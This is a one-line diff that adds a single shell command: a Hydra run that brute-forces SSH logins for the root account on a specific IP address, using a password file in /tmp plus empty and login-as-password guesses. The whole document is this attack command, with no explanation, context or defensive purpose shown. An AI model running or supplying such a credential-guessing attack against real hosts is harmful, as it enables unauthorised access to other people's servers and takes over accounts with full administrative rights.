@@ -1,0 +1,1 @@
+hydra -l root -P /tmp/passwords.txt -e ns -vV  182.118.1.21 ssh2
